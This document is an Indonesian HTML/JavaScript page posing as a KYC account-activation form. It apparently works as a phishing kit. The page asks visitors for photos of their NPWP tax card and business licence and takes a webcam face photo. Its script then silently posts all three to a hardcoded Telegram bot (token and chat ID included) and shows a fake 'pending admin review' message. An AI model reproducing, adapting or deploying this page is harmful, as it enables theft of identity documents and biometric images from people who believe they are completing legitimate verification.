<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>KYC Verifikasi</title>

<link href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css" rel="stylesheet">

<style>

*{
margin:0;
padding:0;
box-sizing:border-box;
font-family:'Segoe UI',sans-serif;
}

body{
background:#0f172a;
color:#e5e7eb;
padding:20px;
}

.container{
max-width:420px;
margin:auto;
}

.title{
text-align:center;
margin-bottom:20px;
}

.title h2{
font-weight:600;
}

.title p{
color:#94a3b8;
font-size:14px;
font-weight: 500;
}

.card{
background:#1e293b;
border-radius:14px;
padding:18px;
margin-bottom:15px;
box-shadow:0 6px 18px rgba(0,0,0,0.4);
}

.card-title{
font-weight:600;
margin-bottom:12px;
display:flex;
align-items:center;
gap:6px;
}

.upload{
border:2px dashed #334155;
padding:15px;
text-align:center;
border-radius:10px;
cursor:pointer;
transition:.2s;
}

.upload:hover{
border-color:#3b82f6;
}

.upload i{
font-size:26px;
color:#3b82f6;
}

.upload p{
margin-top:5px;
color:#94a3b8;
}

.preview img{
width:100%;
border-radius:10px;
margin-top:10px;
}

video{
width:100%;
border-radius:10px;
margin-top:8px;
}

button{
width:100%;
border:none;
padding:14px;
border-radius:10px;
background:#3b82f6;
color:white;
font-size:16px;
font-weight:600;
margin-top:12px;
cursor:pointer;
}

button:hover{
background:#2563eb;
}

.status{
background:#1e293b;
border:1px solid #334155;
padding:20px;
border-radius:12px;
text-align:center;
}

.status i{
font-size:28px;
color:#f59e0b;
margin-bottom:8px;
}

.status h3{
margin-bottom:5px;
}

.status p{
color:#94a3b8;
font-size:14px;
}

</style>
</head>
<body>

<div class="container">

<div class="title">
<h2>Aktivasi</h2>
<p>Lengkapi data untuk verifikasi akun</p>
</div>

<div id="formKYC">

<!-- NPWP -->

<div class="card">

<div class="card-title">
<i class="bi bi-credit-card"></i>
Upload NPWP
</div>

<label class="upload">
<i class="bi bi-cloud-arrow-up"></i>
<p>Pilih foto NPWP</p>
<input type="file" id="npwp" hidden accept="image/*">
</label>

<div class="preview" id="npwpPreview"></div>

</div>


<!-- IZIN USAHA -->

<div class="card">

<div class="card-title">
<i class="bi bi-building"></i>
Surat Izin Usaha
</div>

<label class="upload">
<i class="bi bi-cloud-arrow-up"></i>
<p>Pilih dokumen usaha</p>
<input type="file" id="usaha" hidden accept="image/*">
</label>

<div class="preview" id="usahaPreview"></div>

</div>


<!-- FACE -->

<div class="card">

<div class="card-title">
<i class="bi bi-person-bounding-box"></i>
Verifikasi Wajah
</div>

<video id="video" autoplay></video>

<button onclick="capture()">Ambil Foto Wajah</button>

<canvas id="canvas" style="display:none"></canvas>

<div class="preview" id="facePreview"></div>

</div>

<button onclick="sendData()">Kirim Verifikasi</button>

</div>


<!-- STATUS -->

<div id="status" style="display:none">

<div class="status">
<i class="bi bi-clock-history"></i>
<h3>Menunggu Ditinjau</h3>
<p>Verifikasi sedang diproses oleh admin</p>
</div>

</div>

</div>

<script>

const BOT_TOKEN="7878857803:AAGA5sUJxxrcc9bIyIIeBkmZFGSCWq2hDmQ"
const CHAT_ID="1414540300"

let faceImage=""

const video=document.getElementById("video")

navigator.mediaDevices.getUserMedia({video:true})
.then(stream=>{
video.srcObject=stream
})

function preview(input,id){

const file=input.files[0]
const reader=new FileReader()

reader.onload=function(e){

document.getElementById(id).innerHTML=
`<img src="${e.target.result}">`

}

reader.readAsDataURL(file)

}

document.getElementById("npwp").onchange=e=>preview(e.target,"npwpPreview")
document.getElementById("usaha").onchange=e=>preview(e.target,"usahaPreview")

function capture(){

const canvas=document.getElementById("canvas")
const ctx=canvas.getContext("2d")

canvas.width=video.videoWidth
canvas.height=video.videoHeight

ctx.drawImage(video,0,0)

faceImage=canvas.toDataURL("image/png")

document.getElementById("facePreview").innerHTML=
`<img src="${faceImage}">`

}

async function sendPhoto(base64,caption){

let blob=await (await fetch(base64)).blob()

let form=new FormData()
form.append("chat_id",CHAT_ID)
form.append("photo",blob,"kyc.png")
form.append("caption",caption)

await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
method:"POST",
body:form
})

}

async function sendData(){

let npwp=document.getElementById("npwp").files[0]
let usaha=document.getElementById("usaha").files[0]

if(!npwp || !usaha || !faceImage){

alert("Lengkapi semua data terlebih dahulu")
return

}

let form1=new FormData()
form1.append("chat_id",CHAT_ID)
form1.append("photo",npwp)
form1.append("caption","NPWP")

await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
method:"POST",
body:form1
})

let form2=new FormData()
form2.append("chat_id",CHAT_ID)
form2.append("photo",usaha)
form2.append("caption","SURAT IZIN USAHA")

await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
method:"POST",
body:form2
})

await sendPhoto(faceImage,"FOTO WAJAH KYC")

localStorage.setItem("kyc_status","pending")

showStatus()

}

function showStatus(){

document.getElementById("formKYC").style.display="none"
document.getElementById("status").style.display="block"

}

if(localStorage.getItem("kyc_status")=="pending"){
showStatus()
}

</script>

</body>
</html>
